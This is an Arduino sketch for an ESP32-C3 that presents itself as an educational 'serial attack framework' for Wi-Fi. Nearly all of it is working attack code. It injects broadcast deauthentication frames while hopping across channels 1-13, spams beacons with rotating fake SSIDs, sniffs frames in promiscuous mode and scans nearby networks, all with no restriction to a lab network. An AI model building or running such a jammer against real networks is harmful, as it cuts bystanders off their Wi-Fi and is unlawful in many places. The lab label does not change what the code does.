/*
  ESP32-C3 Serial-Controlled WiFi Framework + Live Monitor (Educational Lab Use Only)
  Controlled entirely via Arduino IDE Serial Monitor (115200 baud)
*/

#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include <cstring>

// Attack control flags
bool deauthAllRunning = false;
bool beaconSpamRunning = false;
bool monitorRunning = false;

// Beacon spam data
String beaconSSIDs[] = {
  "Free Coffee", "FBI Surveillance Van", "Public WiFi 5G", "Click for Virus",
  "Mall Free WiFi", "Airport Hotspot", "Evil Free Internet", "Government Spy",
  "Virus Detected", "Update Your iPhone", "Free Netflix", "Hack The Planet",
  "Police Drone", "WiFi 6E Beta", "Tesla Charging", "Anonymous Network",
  "Dark Web Access", "School Free WiFi", "Work from Home", "Corona Vaccine WiFi"
};
const int numBeaconSSIDs = 20;
unsigned long beaconSpamLastChange = 0;
int beaconSpamIndex = 0;

// -------------------------------------------------------------------
// Packet injection helpers
// -------------------------------------------------------------------
esp_err_t send_deauth_frame(uint8_t* bssid, uint8_t channel, bool broadcast) {
  uint8_t deauth_frame[] = {
    0xC0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
  };
  if (broadcast) {
    memset(deauth_frame + 4, 0xFF, 6);
  } else {
    memcpy(deauth_frame + 4, bssid, 6);
  }
  memcpy(deauth_frame + 10, bssid, 6);
  memcpy(deauth_frame + 16, bssid, 6);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
  return ESP_OK;
}

void deauth_all_on_channel(int channel) {
  uint8_t broadcast_bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  send_deauth_frame(broadcast_bssid, channel, true);
}

// -------------------------------------------------------------------
// Live Monitor Mode (Packet Inspector)
// -------------------------------------------------------------------
typedef struct {
  uint8_t frame_control[2];
  uint16_t duration;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  uint16_t sequence_control;
} __attribute__((packed)) wifi_mac_header_t;

void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!monitorRunning) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->rx_ctrl.sig_len < sizeof(wifi_mac_header_t)) return;

  wifi_mac_header_t *mac_header = (wifi_mac_header_t *)pkt->payload;

  uint8_t frame_type = (mac_header->frame_control[0] >> 2) & 0x03; 
  uint8_t frame_subtype = (mac_header->frame_control[0] >> 4) & 0x0F;

  if (frame_type == 0) { // Management Frames
    if (frame_subtype == 4) {
      Serial.printf("[PROBE REQ] Device searching for Wi-Fi | RSSI: %d dBm\n", pkt->rx_ctrl.rssi);
    } else if (frame_subtype == 0) {
      Serial.printf("[ASSOC REQ] Device requesting connection | RSSI: %d dBm\n", pkt->rx_ctrl.rssi);
    }
  } 
  else if (frame_type == 2) { // Data Frames
    static unsigned long lastPrint = 0;
    if (millis() - lastPrint > 400) {
      lastPrint = millis();
      Serial.printf("[DATA TRAFFIC] Active encrypted frame flow | RSSI: %d dBm\n", pkt->rx_ctrl.rssi);
    }
  }
}

void startMonitor() {
  esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
  esp_wifi_set_promiscuous(true);
  Serial.println("\n[+] Live Packet Monitor Active. Listening for wireless events...");
}

// -------------------------------------------------------------------
// Wi-Fi Network Scanner (Option 4)
// -------------------------------------------------------------------
void performScan() {
  Serial.println("\n[~/] Scanning for nearby Wi-Fi networks (please wait)...");
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("[!] No networks found.");
  } else {
    Serial.printf("[+] Found %d networks:\n", n);
    Serial.println("--------------------------------------------------");
    Serial.printf("%-32s | %-5s | %-5s | %s\n", "SSID", "RSSI", "Ch", "Encrypted");
    Serial.println("--------------------------------------------------");
    for (int i = 0; i < n; ++i) {
      String enc = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secure";
      Serial.printf("%-32s | %-5d | %-5d | %s\n", 
                    WiFi.SSID(i).c_str(), 
                    WiFi.RSSI(i), 
                    WiFi.channel(i), 
                    enc.c_str());
    }
    Serial.println("--------------------------------------------------");
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32_Lab_Node", "password123");
  printMenu();
}

// -------------------------------------------------------------------
// Menu Display
// -------------------------------------------------------------------
void printMenu() {
  Serial.println("\n========================================");
  Serial.println("   ESP32-C3 SERIAL ATTACK FRAMEWORK");
  Serial.println("========================================");
  Serial.println("Select an option by typing the command:");
  Serial.println("  [1] Start Deauth All (Channel Hopping)");
  Serial.println("  [2] Start Beacon Spam (Rotating SSIDs)");
  Serial.println("  [3] Start Live Packet Monitor (Sniffer)");
  Serial.println("  [4] Scan Nearby Wi-Fi Networks");
  Serial.println("  [0] STOP ALL ATTACKS");
  Serial.println("========================================");
}

// -------------------------------------------------------------------
// Setup & Loop
// -------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(2000);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32_Lab_Node", "password123");
  esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);

  Serial.println("\n[+] ESP32-C3 Initialized Successfully.");
  printMenu();
}

void loop() {
  if (Serial.available() > 0) {
    char cmd = Serial.read();
    while(Serial.available() > 0) Serial.read();

    switch (cmd) {
      case '1':
        deauthAllRunning = true;
        beaconSpamRunning = false;
        monitorRunning = false;
        esp_wifi_set_promiscuous(false);
        Serial.println("\n[+] Started: Deauth All running across channels 1-13.");
        break;

      case '2':
        deauthAllRunning = false;
        beaconSpamRunning = true;
        monitorRunning = false;
        esp_wifi_set_promiscuous(false);
        Serial.println("\n[+] Started: Beacon Spam rotating SSIDs.");
        break;

      case '3':
        deauthAllRunning = false;
        beaconSpamRunning = false;
        monitorRunning = true;
        startMonitor();
        break;

      case '4':
        deauthAllRunning = false;
        beaconSpamRunning = false;
        monitorRunning = false;
        esp_wifi_set_promiscuous(false);
        performScan();
        break;

      case '0':
        deauthAllRunning = false;
        beaconSpamRunning = false;
        monitorRunning = false;
        esp_wifi_set_promiscuous(false);
        WiFi.softAP("ESP32_Lab_Node", "password123");
        Serial.println("\n[!] ALL ATTACKS STOPPED.");
        printMenu();
        break;
        
      default:
        Serial.println("\n[?] Unknown command. Press 1, 2, 3, 4, or 0.");
        break;
    }
  }

  // Background loops
  if (deauthAllRunning) {
    static unsigned long lastDeauth = 0;
    static int chan = 1;
    if (millis() - lastDeauth > 50) {
      lastDeauth = millis();
      deauth_all_on_channel(chan);
      chan = (chan % 13) + 1;
    }
  }

  if (beaconSpamRunning) {
    if (millis() - beaconSpamLastChange > 2000) {
      beaconSpamLastChange = millis();
      String newSSID = beaconSSIDs[beaconSpamIndex % numBeaconSSIDs];
      beaconSpamIndex++;
      WiFi.softAPdisconnect(true);
      WiFi.softAP(newSSID.c_str(), NULL, 1, 0, 1);
    }
  }

  delay(5);
}